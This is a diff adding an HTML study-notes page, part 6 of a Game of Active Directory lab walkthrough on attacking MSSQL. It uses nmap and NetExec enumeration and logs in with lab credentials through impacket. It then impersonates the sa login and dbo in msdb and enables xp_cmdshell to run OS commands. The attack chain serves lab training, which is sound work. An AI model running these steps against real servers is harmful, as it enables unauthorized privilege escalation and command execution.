@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOAD Part 6 - MSSQL | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  
+  <style>
+    .goad-content {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: var(--fs-2);
+      margin: 30px 0 15px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: var(--fs-3);
+      margin: 25px 0 10px 0;
+    }
+    
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: var(--fs-4);
+      margin: 20px 0 10px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 15px;
+      line-height: 1.8;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9em;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 15px;
+      overflow-x: auto;
+      margin: 15px 0;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 20px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+  </style>
+</head>
+
+<body>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+
+      <div class="sidebar-info">
+
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png" alt="Mr Stark" width="80">
+        </figure>
+
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">Part 6: MSSQL</p>
+        </div>
+
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+
+      </div>
+
+      <div class="sidebar-info_more">
+
+        <div class="separator"></div>
+
+        <ul class="contacts-list">
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Previous</p>
+              <a href="part-5-adcs.html" class="contact-link">Part 5</a>
+            </div>
+          </li>
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-forward-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Next</p>
+              <a href="part-7-privilege-escalation.html" class="contact-link">Part 7</a>
+            </div>
+          </li>
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="list-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">All Parts</p>
+              <a href="index.html" class="contact-link">GOAD Overview</a>
+            </div>
+          </li>
+
+        </ul>
+
+        <div class="separator"></div>
+
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+
+      </div>
+
+    </aside>
+
+    <div class="main-content">
+
+      <nav class="navbar">
+        <ul class="navbar-list">
+          <li class="navbar-item">
+            <button class="navbar-link  active" data-nav-link>Part 6</button>
+          </li>
+        </ul>
+      </nav>
+
+      <article class="about active" data-page="about">
+
+        <header class="h2 article-title">MSSQL</header>
+
+        <section class="about-text goad-content">
+
+
+<h2>Enumerate the MSSQL servers</h2>
+
+
+<p>Let’s say we are in the begging of a pentesting and we have a network  and we want to find out if theres any MSSQL servers in the network.</p>
+<p>We can start by enumerating MSSQL using NMAP</p>
+<p>sudo nmap -Pn -p 1433 -sV -sC 10.4.10.10-23</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_1.png" alt="">
+
+
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_2.png" alt="">
+
+
+<p>It’s possible to see above that our NMAP scan output shows us 2 hosts configured with MSSQL service, Braavos.essos.local and castleblack.north.sevenkingdoms.local are running as MSSQL server.</p>
+
+<p>since we already know that we do have 2 hosts running MSSQL service, we can now start by enumerating the service unauthenticated and also authenticated using NetExec.</p>
+
+<h3>NetExec </h3>
+
+<p>This project was initially created in 2015 by @byt3bl33d3r, known as CrackMapExec. In 2019 @mpgn_x64 started maintaining the project for the next 4 years, adding a lot of great tools and features. In September 2023 he retired from maintaining the project. So from now on I’ll be using Netexec instead of CrackMapExec.</p>
+
+<h4>Enumerating MSSQL unauthenticated</h4>
+
+<p>We already know that we do have 2 servers running as MSSQL server so we can try to enumerate it using NetExec unauthenticated.</p>
+<p>netexec mssql 10.4.10.22-23</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_3.png" alt="">
+
+
+
+<h4>Enumerating MSSQL authenticated</h4>
+
+<p>Assuming that we do have a valid user on the domain, we can also use NetExec to enumerate the service using a valid user.</p>
+<p>netexec mssql 10.4.10.22 -u 'samwell.tarly' -p 'Heartsbane' -d 'north.sevenkingdoms.local’</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_4.png" alt="">
+
+
+<p>The output above shows us a [+] signal, it means that this user has access to MSSQL database.</p>
+
+<p>Since we do have a valid user for this MSSQL database, we can use mssqlclient.py from impacket to login into MSSQL service.</p>
+<p>mssqlclient.py -windows-auth 'north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local'</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_5.png" alt="">
+
+
+<p>We have accessed the MSSQL server. that’s great.</p>
+
+<h4>Enumerating MSSQL</h4>
+
+<p>Once we are inside MSSQL server using mssqlclient.py from impacket, we do have lots of options to start our MSSQL enumeration.</p>
+<p>Let’s start by enumerating login users.</p>
+<p>enum_logins</p>
+<p>The just issued command will make the following request to MSSQL database:</p>
+<pre><code>select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, 
+sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin 
+from  master.sys.server_principals r 
+left join master.sys.syslogins sl on sl.sid = r.sid 
+where r.type in ('S','E','X','U','G')</code></pre>
+
+
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_6.png" alt="">
+
+
+<p>This is the output we get from the database query. This output shows that we are simply basic viewer users, meaning we don’t have high privilege role in this database.</p>
+<h2>Impersonate - execute as login</h2>
+
+<p>Let’s see if we can enumerate some valid impersonation here. </p>
+
+<p>enum_impersonate</p>
+<p>the command issued above will make the following queries into the MSSQL database listing all login with impersonation permission:</p>
+<pre><code>SELECT 'LOGIN' as 'execute as','' AS 'database', 
+pe.permission_name, pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' 
+FROM sys.server_permissions pe 
+JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_Id 
+JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'</code></pre>
+
+
+
+<p>The same request will also issue the request on each database in this MSSQL server:</p>
+<pre><code>use <db>;
+SELECT 'USER' as 'execute as', DB_NAME() AS 'database',
+pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' 
+FROM sys.database_permissions pe 
+JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_Id 
+JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'</code></pre>
+
+
+
+
+<p>“SQL Login is for Authentication and SQL Server User is for Authorization. Authentication can decide if we have permissions to access the server or not and Authorization decides what are different operations we can do in a database. Login is created at the SQL Server instance level and User is created at the SQL Server database level. We can have multiple users from a different database connected to a single login to a server.”</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_7.png" alt="">
+
+
+
+<p>As we can see from the output, our user Samwell.Tarly can make queries to this database as user sa.</p>
+<p>The sa account is the built-in super user account for MSSQL and has full administrative privileges.</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_8.png" alt="">
+
+
+<p>So Samwell.Tarly user can impersonate user sa. Let’s impersonate sa user and execute OS commands with xp_cmdshell.</p>
+
+<p>exec_as_login sa = It’s equivalent to execute as login='sa';query.</p>
+<p>enable_xp_cmdshell = It’s equivalent to exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;query.</p>
+<p>xp_cmdshell whoami = I’ts equivalent to exec master..xp_cmdshell 'whoami' query.</p>
+
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_9.png" alt="">
+
+
+<p>As stated on the screenshot above, as can see that we were able to impersonate the high privileged user sa and we can now execute OS commands as sa.</p>
+<p>Now let’s do the enumeration as sa user.</p>
+<p>We can see below that we can execute all kinds of OS commands and here we do have an example. we can see everything in the dir C:\.</p>
+<p>EXEC xp_cmdshell "dir C:\"</p>
+<p>xp_cmdshell dir C:\</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_10.png" alt="">
+
+
+
+<h4>Let’s Continue our MSSQL enumeration</h4>
+
+<p>enum_logins</p>
+<p>Now it’s possible to see that we can now see away more users since we are requesting with a highly privileged user.</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_11.png" alt="">
+
+
+<p>It’s possible to see from the screenshot above several users, and we can see as well that user jon.snow is SysAdmin since we can see its sysadmin status to 1same as sa user.</p>
+<p>Let’s try to impersonate other users as well, let’s see if there’s another impersonation privilege here.</p>
+<p>enum_impersonate</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_12.png" alt="">
+
+
+<p>As sysadmin user sa we can see all the information in the database and so the others users with impersonation privileges.</p>
+<p>Another way to get in could be to access as brandon.stark and do execute as login on user jon.snow.</p>
+
+<h2>Impersonate - Execute as user</h2>
+
+<p>Now this time let’s connect to the DB as arya.stark.</p>
+<p>mssqlclient.py -windows-auth 'north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local'</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_13.png" alt="">
+
+
+<p>Enumerating databases.</p>
+<p>select name from master.dbo.sysdatabases;</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_14.png" alt="">
+
+
+<p>Let’s use master database.</p>
+<p>use master;</p>
+
+<p>Now let’s enumerate and see if the user ayra.stark can impersonate other user.</p>
+<p>enum_impersonate</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_15.png" alt="">
+
+
+<p>Our enumeration shows us that arya.stark can impersonate dbo in master and msdb database.</p>
+
+<p>We use master db and impersonate user dbo but we can’t execute OS Commands. Errors are shown on the screenshot below.</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_16.png" alt="">
+
+
+
+<p>Now let’s change the database to msdb. </p>
+<p>use msdb;</p>
+<p>The difference between the two databases is that msdb got the trustworthy property set, trustworthy property is set by default on msdb database.</p>
+<p>enum_db</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_17.png" alt="">
+
+
+<p>So putting things together after enumeration.</p>
+<p>based on the enum_impersonate command we can see that we user ayra.stark can impersonate dbo on msdb database and since trustworthy set is enabled by default on msdb database, we can take advantage by abusing this and get OS command execution</p>
+<p>use msdb</p>
+<p>exec_as_user dbo</p>
+<p>enable_xp_cmdshell</p>
+<p>xp_cmdshell whoami</p>
+<img src="./game-of-active-directory/part-6-mssql/images/screenshot_18.png" alt="">
+
+
+
+<p>xp_cmdshell dir C:\</p>
+<p>EXEC xp_cmdshell "dir C:\"</p>
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-5-adcs.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">← Previous: Part 5</a>
+  <a href="part-7-privilege-escalation.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 7 →</a>
+</div>
+
+        </section>
+
+      </article>
+
+    </div>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
